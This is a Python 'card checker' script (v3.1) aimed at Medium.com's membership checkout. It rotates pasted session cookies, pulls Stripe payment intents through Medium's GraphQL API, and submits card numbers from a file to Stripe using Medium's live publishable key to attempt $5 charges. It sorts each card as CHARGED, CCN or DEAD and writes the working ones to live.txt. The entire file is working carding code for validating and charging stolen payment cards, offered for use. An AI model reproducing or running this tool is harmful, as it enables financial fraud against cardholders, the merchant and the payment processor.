"""
Medium.com Card Checker for Pydroid3
Full $5 Charge Gate with Multiple Cookie Rotation
v3.1 - Fixed GraphQL mutations
"""

import requests
import random
import string
import uuid
import time
import os
import re
import json

# ============ CONFIGURATION ============
INPUT_FILE = "cards.txt"
COOKIE_FILE = "cookies.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 3
DEBUG = True
# =======================================

def log(msg):
    if DEBUG:
        print(f"[DEBUG] {msg}")

def generate_guid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_muid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_sid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def get_bin_info(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=10)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','?').upper()} - {d.get('type','?').upper()} | {d.get('bank',{}).get('name','?')} | {d.get('country',{}).get('name','?')} {d.get('country',{}).get('emoji','')}"
    except:
        pass
    return f"BIN: {cc[:6]}"

def extract_cookies_from_block(block):
    cookies = {}
    pattern = r"['\"]([^'\"]+)['\"]\s*:\s*['\"]([^'\"]*)['\"]"
    matches = re.findall(pattern, block)
    skip_keys = ['authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 
                 'user-agent', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest',
                 'sec-fetch-mode', 'sec-fetch-site', 'apollographql-client-name', 'apollographql-client-version',
                 'graphql-operation', 'medium-frontend-app', 'medium-frontend-path', 'medium-frontend-route',
                 'operationName', 'query', 'payload']
    for key, value in matches:
        if key not in skip_keys:
            cookies[key] = value
    return cookies

def load_all_cookies():
    if not os.path.exists(COOKIE_FILE):
        return []
    with open(COOKIE_FILE, 'r') as f:
        content = f.read()
    cookie_sets = []
    matches = re.findall(r'cookies\s*=\s*\{([^}]+)\}', content, re.DOTALL)
    for match in matches:
        cookies = extract_cookies_from_block('{' + match + '}')
        if cookies and 'uid' in cookies and 'sid' in cookies:
            cookie_sets.append(cookies)
    seen = set()
    unique = []
    for c in cookie_sets:
        k = c.get('uid','') + c.get('sid','')
        if k and k not in seen:
            seen.add(k)
            unique.append(c)
    return unique

def get_payment_intent(cookies):
    """Get payment intent via GraphQL"""
    
    cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
    
    headers = {
        'authority': 'medium.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'cookie': cookie_str,
        'origin': 'https://medium.com',
        'referer': 'https://medium.com/plans/confirmation/monthly',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'apollographql-client-name': 'lite',
        'apollographql-client-version': 'main-20260116-161017-b2412ec54c',
        'medium-frontend-app': 'lite/main-20260116-161017-b2412ec54c',
        'medium-frontend-path': '/plans/confirmation/monthly',
        'medium-frontend-route': 'pay',
        'graphql-operation': 'MembershipCheckoutPageQuery',
    }
    
    xsrf = cookies.get('xsrf', '')
    if xsrf:
        headers['x-xsrf-token'] = xsrf
    
    # List of mutations to try
    mutations = [
        # Query to get existing payment intent
        {
            'operationName': 'MembershipCheckoutPageQuery',
            'variables': {'planId': 'monthly'},
            'query': '''query MembershipCheckoutPageQuery($planId: String!) {
                membershipCheckoutPage(planId: $planId) {
                    clientSecret
                    paymentIntentId
                    __typename
                }
            }'''
        },
        {
            'operationName': 'GetPaymentIntent',
            'variables': {'plan': 'monthly'},
            'query': '''query GetPaymentIntent($plan: String!) {
                paymentIntent(plan: $plan) {
                    clientSecret
                    __typename
                }
            }'''
        },
        {
            'operationName': 'CreateMembershipPaymentIntent',
            'variables': {'planId': 'monthly'},
            'query': '''mutation CreateMembershipPaymentIntent($planId: String!) {
                createMembershipPaymentIntent(planId: $planId) {
                    clientSecret
                    __typename
                }
            }'''
        },
        {
            'operationName': 'InitiateMembershipCheckout',
            'variables': {'planType': 'monthly'},
            'query': '''mutation InitiateMembershipCheckout($planType: String!) {
                initiateMembershipCheckout(planType: $planType) {
                    clientSecret
                    __typename
                }
            }'''
        },
        {
            'operationName': 'StartMembershipPurchase',
            'variables': {'plan': 'monthly'},
            'query': '''mutation StartMembershipPurchase($plan: String!) {
                startMembershipPurchase(plan: $plan) {
                    clientSecret
                    __typename
                }
            }'''
        },
        {
            'operationName': 'PrepareSubscription',
            'variables': {'planId': 'monthly'},
            'query': '''mutation PrepareSubscription($planId: String!) {
                prepareSubscription(planId: $planId) {
                    clientSecret
                    __typename
                }
            }'''
        },
    ]
    
    for mutation in mutations:
        try:
            log(f"Trying: {mutation['operationName']}")
            headers['graphql-operation'] = mutation['operationName']
            
            r = requests.post('https://medium.com/_/graphql', headers=headers, json=mutation, timeout=30)
            data = r.json()
            
            log(f"Response: {str(data)[:200]}")
            
            # Check for errors
            if 'errors' in data:
                continue
            
            # Look for clientSecret in response
            if 'data' in data:
                for key, val in data['data'].items():
                    if val and isinstance(val, dict):
                        secret = val.get('clientSecret')
                        if secret and ('pi_' in secret or 'seti_' in secret):
                            intent_id = secret.split('_secret_')[0]
                            log(f"Found: {intent_id}")
                            return intent_id, secret, None
        except Exception as e:
            log(f"Error: {e}")
            continue
    
    return None, None, "All GraphQL mutations failed"

def create_payment_method(cc, mes, ano, cvv):
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': generate_guid(),
        'muid': generate_muid(),
        'sid': generate_sid(),
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://medium.com',
        'time_on_page': str(random.randint(30000, 60000)),
        'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'key': 'pk_live_7FReX44VnNIInZwrIIx6ghjl',
        '_stripe_version': '2025-03-31.basil',
    }
    
    try:
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def confirm_payment(pm_id, intent_id, client_secret):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'return_url': 'https://medium.com/welcome-member',
        'payment_method': pm_id,
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
        'key': 'pk_live_7FReX44VnNIInZwrIIx6ghjl',
        '_stripe_version': '2025-03-31.basil',
        'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
        'client_attribution_metadata[merchant_integration_source]': 'l1',
        'client_secret': client_secret,
    }
    
    if intent_id.startswith('seti_'):
        url = f'https://api.stripe.com/v1/setup_intents/{intent_id}/confirm'
    else:
        url = f'https://api.stripe.com/v1/payment_intents/{intent_id}/confirm'
    
    try:
        r = requests.post(url, headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def parse_response(response):
    if 'error' in response:
        error = response['error']
        code = error.get('code', '')
        decline_code = error.get('decline_code', '')
        message = error.get('message', '')
        
        ccn_codes = ['incorrect_cvc', 'invalid_cvc', 'incorrect_zip', 'insufficient_funds',
                     'card_velocity_exceeded', 'do_not_honor', 'generic_decline', 'lost_card',
                     'stolen_card', 'pickup_card', 'restricted_card', 'security_violation',
                     'service_not_allowed', 'transaction_not_allowed', 'try_again_later',
                     'withdrawal_count_limit_exceeded', 'expired_card']
        
        if 'authentication' in message.lower() or code == 'authentication_required':
            return 'CCN', '3DS Required'
        if code in ccn_codes or decline_code in ccn_codes:
            return 'CCN', decline_code or code
        if 'rate_limit' in code:
            return 'RATE_LIMIT', message
        return 'DECLINED', decline_code or code or message
    
    status = response.get('status', '')
    if status == 'succeeded':
        return 'CHARGED', 'Payment Successful!'
    elif status == 'requires_action':
        return 'CCN', '3DS Required'
    elif status == 'processing':
        return 'CHARGED', 'Processing'
    return 'DECLINED', f"Status: {status}"

def check_card(cookies, cc, mes, ano, cvv):
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    # Get payment intent
    log("Getting payment intent...")
    intent_id, client_secret, error = get_payment_intent(cookies)
    
    if not intent_id:
        return 'ERROR', f"PI: {error}"
    
    # Create payment method
    log("Creating PM...")
    pm_resp = create_payment_method(cc, mes, ano, cvv)
    
    if 'error' in pm_resp:
        code = pm_resp['error'].get('code', '')
        msg = pm_resp['error'].get('message', '')
        if code in ['incorrect_cvc', 'invalid_cvc', 'expired_card']:
            return 'CCN', code
        return 'DECLINED', code or msg
    
    pm_id = pm_resp.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM ID'
    
    log(f"PM: {pm_id}")
    
    # Confirm payment
    log("Confirming...")
    confirm_resp = confirm_payment(pm_id, intent_id, client_secret)
    
    return parse_response(confirm_resp)

def save_result(card, status, msg):
    file = LIVE_FILE if status in ['CHARGED', 'CCN'] else DEAD_FILE
    with open(file, 'a') as f:
        f.write(f"{card} | {msg}\n")

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║      MEDIUM.COM CARD CHECKER          ║
    ║         FOR PYDROID3 v3.1             ║
    ║   $5 CHARGE - MULTI COOKIE ROTATION   ║
    ╚═══════════════════════════════════════╝
    """)
    
    cookies_list = load_all_cookies()
    
    if not cookies_list:
        print(f"[!] No cookies in {COOKIE_FILE}")
        with open(COOKIE_FILE, 'w') as f:
            f.write("# Paste cookies = { } blocks here\n")
        return
    
    print(f"[+] Loaded {len(cookies_list)} cookie set(s)")
    for i, c in enumerate(cookies_list, 1):
        print(f"    [{i}] uid: {c.get('uid','')[:10]}... | xsrf: {'Yes' if c.get('xsrf') else 'No'}")
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"[*] Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if l.strip() and not l.startswith('#') and '|' in l]
    
    if not cards:
        print("[!] No cards")
        return
    
    print(f"\n[*] Cards: {len(cards)}")
    print("=" * 50)
    
    stats = {'charged': 0, 'ccn': 0, 'dead': 0, 'error': 0}
    cidx = 0
    
    for i, card in enumerate(cards, 1):
        p = card.split('|')
        if len(p) < 4:
            continue
        cc, mes, ano, cvv = p[0], p[1], p[2], p[3]
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        cookies = cookies_list[cidx]
        print(f"\n[{i}/{len(cards)}] {cc[:6]}...{cc[-4:]}")
        
        start = time.time()
        status, msg = check_card(cookies, cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        if status == 'CHARGED':
            print(f"[CHARGED] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            stats['charged'] += 1
            save_result(full, status, msg)
        elif status == 'CCN':
            print(f"[CCN] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            stats['ccn'] += 1
            save_result(full, status, msg)
        elif status == 'ERROR':
            print(f"[ERROR] {msg}")
            stats['error'] += 1
        else:
            print(f"[DEAD] {full}")
            print(f"[-] {msg}")
            stats['dead'] += 1
            save_result(full, status, msg)
        
        print(f"[*] {t}s")
        cidx = (cidx + 1) % len(cookies_list)
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 50)
    print(f"CHARGED: {stats['charged']} | CCN: {stats['ccn']} | DEAD: {stats['dead']} | ERROR: {stats['error']}")

if __name__ == "__main__":
    main()
